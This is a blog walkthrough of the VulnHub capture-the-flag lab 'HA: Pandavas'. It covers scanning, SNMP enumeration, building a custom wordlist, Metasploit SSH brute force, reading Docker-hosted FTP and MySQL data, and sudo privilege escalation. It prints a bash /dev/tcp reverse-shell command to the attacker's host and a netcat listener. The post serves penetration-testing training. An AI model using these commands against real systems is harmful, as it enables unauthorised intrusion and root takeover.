@@ -1,0 +1,107 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">HA: Pandavas Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-pandavas-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-06-16T12:36:04+00:00">June 16, 2020</time><time class="updated" datetime="2025-06-10T20:10:27+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “Pandavas”. It’s available at Vulnhub for penetration testing practice. This lab is not difficult if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to <strong><a style="color: #000000;" href="https://www.hackingarticles.in/">Hacking Articles</a></strong>. Let’s get started and learn how to break it down successfully.</span></p>
+<p><span style="color: #000000;">Level: Not defined</span></p>
+<p><span style="color: #000000;">Since these labs are available on the Vulnhub website. Let’s download the lab file from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/ha-pandavas,487/">here</a></strong></span>.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Snmpwalk</span></li>
+<li><span style="color: #000000;">Dirb</span></li>
+<li><span style="color: #000000;">CeWL</span></li>
+<li><span style="color: #000000;">Bruteforce with Metasploit</span></li>
+<li><span style="color: #000000;">LinEnum</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SSH login</span></li>
+<li><span style="color: #000000;">Dockers Services</span></li>
+<li><span style="color: #000000;">mysqldump</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing SUDO</span></li>
+<li><span style="color: #000000;">Capture the flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
+<p><span style="color: #000000;">As always we identify the host’s IP with the “Netdiscover” tool:</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-w2Un7pzogls/Xui4Hy5AlnI/AAAAAAAAk3Y/nr1DtnFiq2AdPlDfQj42xAvTSbveiGzSACLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">So, let’s start by listing all the TCP ports with nmap.</span></p>
+<pre class="lang:default decode:true">nmap -sV -p- 192.168.10.162</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-21WUTUwbVBI/Xui4M-seSLI/AAAAAAAAk3g/h40RD3Wt5UMlWUe4A-CwHypcFo0nfU_YACLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">Then, we will do a second scan but pay attention, we will add to the command “-sU” to get the UDP services.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-UVy0Pqk2oXo/Xui4TmDBx9I/AAAAAAAAk3w/sVCQZ2gjSt0LNwZxTqfsBeCtBHQfcaVvQCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">This second check for UDP services will take longer, so while nmap is finishing, we will take the opportunity to check the TCP services found.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">We start by visiting the web service (port 80), we find several pictures and information about the Pandavas, we check the source code and robots.txt, it seems that there is nothing useful. (or at least, for the moment)</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-LcnaZRwzX2I/Xui4aRnjZMI/AAAAAAAAk38/JWPM8Sl99y8PU0Spnw8VzQKfx1g73ixowCLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">With the help of Dirb, we will use a big dictionary of words and a short one with more known extensions and we will find a file called “<strong>hidden.docx</strong>“</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-eqHJiXAzMmQ/Xui4hCK15oI/AAAAAAAAk4A/j_OPzSd2u7AuSQGrZaJAONTapasjsUOxgCLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">We downloaded the “<strong>hidden.docx</strong>” file:</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-29R049OJJ2I/Xui4lYXQc2I/AAAAAAAAk4I/W9YOWbFMLfcarVDuem5-HZPBbO59xyKygCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">We open the document, it gives us more details of the history of the “Pandavas”, below we see a clue that will lead us to the first flag.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-q8BdCbxwDLo/Xui4rR-TtYI/AAAAAAAAk4Q/pSBzuwJXnLcEGuzHG3_x2bGLJMKSQNIqQCLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">We copy the text and paste it in nano or another text editor, there the flag will appear by magic.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-M9dWbCwWV4M/Xui4xD8RLnI/AAAAAAAAk4U/BUsNdwNfPsELFMlH11YIrIemsys4RATGgCLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;">Now, in the enumeration of UDP services, we detect an SNMP service (port 161), this service is usually misconfigured with a “public” channel where it usually shows confidential information of services and other applications of an organization.</span></p>
+<p><span style="color: #000000;">For this we will use the tool “snmpwalk” and there we will find the second flag and a user name of the machine.</span></p>
+<pre class="lang:default decode:true">snmpwalk -v1 -c public 192.168.10.162 |more</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-oMZCGkUuPS0/Xui41r71KAI/AAAAAAAAk4Y/JxczNBMtzPUeP_shyi7EuGXVVOpm66ToQCLcBGAsYHQ/s1600/9.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
+<p><span style="color: #000000;">We already have a user, but we are missing the password, I tried a dictionary with the 1000 most used passwords, but our friends from “<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/">Hacking Articles</a></strong></span>” were not going to make it easy for us. So I had to create a custom dictionary using the web service page (remember, port 80).</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-MHw1GNaJkA0/Xui46N8dvMI/AAAAAAAAk4c/7qdckPJ0iEIuKyUljWzqOyWfPaMzB83PQCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">Once our dictionary is created, we use the “<strong>SSH LOGIN</strong>” module from Metasploit, we configure it with the user “<strong>karna</strong>” and with our custom dictionary.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-AICzwzWw_WM/Xui5A2Q9k3I/AAAAAAAAk4g/EmMU1hCg4y0pX3B3nbU0BeeIsBHKFIOlQCLcBGAsYHQ/s1600/11.png"/></p>
+<p><span style="color: #000000;">Perfect! So now we connect via SSH and start exploring the inside of the machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-_qQYpHyK9rM/Xui5G1ixL7I/AAAAAAAAk4s/xqMw_jewTUUnO-kBdvNXEA2enMOogkENQCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">Once inside, we can list the other two users, we check files and binaries that we have permissions, but it doesn’t work for us.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-OFPHKXHApII/Xui5LbITRsI/AAAAAAAAk40/BHcEJ8J0pLIqXIYKUMyPgCe5Zre3tlCigCLcBGAsYHQ/s1600/13.png"/></p>
+<p><span style="color: #000000;">So we launch another credential listing with the Metasploit bruteforce specifying the user “<strong>krishna</strong>”.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ZzOlO7yzvR8/Xui5j3dwFOI/AAAAAAAAk5I/lYqJC6qvU6Y5SsHtp9b1Yg07Dw0zAi7SACLcBGAsYHQ/s1600/14.png"/></p>
+<p><span style="color: #000000;">Great! We authenticate with the user “<strong>krishna</strong>“:</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-wgsabmsZoKA/Xui5m-qEYRI/AAAAAAAAk5Q/K_U4AbgQWNk-qbsVT_w6lmPH3MM-LNnvgCLcBGAsYHQ/s1600/15.png"/></p>
+<p><span style="color: #000000;">With this user, we have sudo access to everything, so we could run a reverse shell as sudo, get root privileges, read the root flag and game over… But we’d still be two flags short of completing the challenge!</span></p>
+<p><span style="color: #000000;">We listed the machine’s interfaces and found that there is a docker presence in at least three services.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RUS-XkwSy_c/Xui5rLrxI1I/AAAAAAAAk5U/_CMh3E9--qMOc8hQ6s6g7xkYFAU9fqDsACLcBGAsYHQ/s1600/16.png"/></p>
+<p><span style="color: #000000;">Now we’ll list the docker processes that are running on the machine and we’ll list an FTP service and a MySQL that seem quite interesting.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-w3MCW08bhS0/Xui5vDwOkTI/AAAAAAAAk5Y/kpXb-1shoNEvwJe90EMM8UMVF8VnDtLBQCLcBGAsYHQ/s1600/17.png"/></p>
+<p><span style="color: #000000;">Start with the FTP service connect:</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-z_tqmZPZgzQ/Xui5zN1iOoI/AAAAAAAAk5c/XlEScA_0bc84I41y44s7N-S3Wlkj0HzOwCLcBGAsYHQ/s1600/18.png"/></p>
+<p><span style="color: #000000;">Go to the “<strong>root</strong>” folder, find a file called “<strong>.ash_history</strong>“, read it and get a flag and credentials encoded in Base64.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-SdsXrnMny8c/Xui53dyDhZI/AAAAAAAAk5k/Hhj5S7Z9n10kXyLeB7SIdPoeJm1kiFf4ACLcBGAsYHQ/s1600/19.png"/></p>
+<p><span style="color: #000000;">Decode the string in base64 and get a password.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-UTPDrsHYcu4/Xui58Vgpb1I/AAAAAAAAk5o/RTGhm8Lir9wkqotgTOxSATPoEDpiGytFQCLcBGAsYHQ/s1600/20.png"/></p>
+<p><span style="color: #000000;">We will now connect to Docker’s MySQL service:</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-FiD_fJsFPGw/Xui6Ql4ddEI/AAAAAAAAk6A/S0XqYEZke3Mz46CJvYfdImLob4DaQM-uQCLcBGAsYHQ/s1600/21.png"/></p>
+<p><span style="color: #000000;">We’ll break into the database with the credentials “root” and the password “<strong>ignite@123</strong>“. We will help ourselves with the following command:</span></p>
+<pre class="lang:default decode:true">mysqldump -A –u root –password=ignite@123 |grep flag</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-lfQbXeJ9fTw/Xui6JfZ-ksI/AAAAAAAAk58/aJW1R1eZgxgJhXKcvfkEVCm8XowNifZPQCLcBGAsYHQ/s1600/22.png"/></p>
+<p><span style="color: #000000;">Perfect, we already have the four flags, now we just need to climb privileges as “<strong>root</strong>” user and read the flag.</span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">There are many ways to get root, I put a terminal with netcat listening on port 4444 and used the following command to raise in my kali a reverse shell as root:</span></p>
+<p><span style="color: #000000;"><strong>In our kali:</strong> </span></p>
+<pre class="lang:default decode:true">nc -nvlp 4444</pre>
+<p><span style="color: #000000;"><strong>On the victim machine</strong>: </span></p>
+<pre class="lang:default decode:true">sudo -u root bash -i &gt;&amp; /dev/tcp/192.168.10.161/4444 0&gt;&amp;1</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-x4Dpcd9HdxA/Xui6XENqn2I/AAAAAAAAk6I/pg7JV0alIQsmzQRztBw8Zyd1SBrVaM2nACLcBGAsYHQ/s1600/23.png"/></p>
+<p><span style="color: #000000;">Now we execute the command in the victim machine and we get a shell as root in our kali.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-3wytwBH0yYw/Xui6bNMClnI/AAAAAAAAk6Q/DxYQI-RqJyMi7FPejukUrICEcLTudlpxwCLcBGAsYHQ/s1600/24.png"/></p>
+<p><span style="color: #000000;">And now yes, we read our beloved root flag and get the fifth and final flag:</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RrmlG6CrpgY/Xui6foTymiI/AAAAAAAAk6U/37wjA71E6yIsldA9ieGlOaAmJZ2Y74lnACLcBGAsYHQ/s1600/25.png"/></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks</span></p>
+<p><span style="color: #000000;">Contacted on <strong><a style="color: #000000;" href="https://www.linkedin.com/in/david-ut%C3%B3n-amaya-971279166/">LinkedIn</a></strong>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
